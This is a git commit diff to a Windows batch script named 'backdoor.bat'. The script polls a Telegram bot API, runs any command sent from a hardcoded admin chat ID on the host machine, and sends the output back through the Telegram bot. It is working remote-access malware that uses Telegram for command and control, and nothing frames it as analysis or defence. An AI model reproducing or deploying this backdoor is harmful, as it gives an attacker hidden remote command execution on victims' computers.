a8ff16ccbb8094e7b10fccc84bddb7ff11a944d8
xxoh111 <muprealen@gmail.com>
2025-08-30 02:51:39 +0300

    Update backdoor.bat

--- backdoor.bat
+++ backdoor.bat
@@ -4,29 +4,21 @@ set ADMIN_ID=7006722745
 set API_URL=https://api.telegram.org/bot%BOT_TOKEN%
 
 :loop
-for /f "tokens=*" %%i in ('curl -s -X POST "%API_URL%/getUpdates" -d offset=0 -d timeout=30') do (
-    set RESPONSE=%%i
-)
+for /f "tokens=*" %%i in ('curl -s -X POST "%API_URL%/getUpdates" -d offset=0') do set RESPONSE=%%i
 
-echo %RESPONSE% | findstr "update_id" >nul
+echo %RESPONSE% | findstr "text" >nul
 if not errorlevel 1 (
-    for /f "tokens=2 delims=:" %%a in ('echo %RESPONSE% ^| findstr "text"') do (
-        set COMMAND=%%a
-        set COMMAND=!COMMAND:~1,-2!
-    )
+    for /f "tokens=2 delims=:" %%a in ('echo %RESPONSE% ^| findstr "text"') do set COMMAND=%%a
+    set COMMAND=%COMMAND:"=%
+    set COMMAND=%COMMAND:,=%
     
-    for /f "tokens=2 delims=:" %%b in ('echo %RESPONSE% ^| findstr "chat"') do (
-        set CHAT_ID=%%b
-        set CHAT_ID=!CHAT_ID:~1,-1!
-    )
+    for /f "tokens=2 delims=:" %%b in ('echo %RESPONSE% ^| findstr "id"') do set CHAT_ID=%%b
+    set CHAT_ID=%CHAT_ID:"=%
+    set CHAT_ID=%CHAT_ID:,=%
     
     if "!CHAT_ID!"=="%ADMIN_ID%" (
-        for /f "tokens=*" %%c in ('!COMMAND! 2^>^&1') do (
-            set OUTPUT=%%c
-        )
-        
+        for /f "tokens=*" %%c in ('!COMMAND! 2^>^&1') do set OUTPUT=%%c
         if "!OUTPUT!"=="" set OUTPUT=Команда выполнена.
-        
         curl -s -X POST "%API_URL%/sendMessage" -d chat_id="%ADMIN_ID%" -d text="!OUTPUT!" >nul
     )
 )
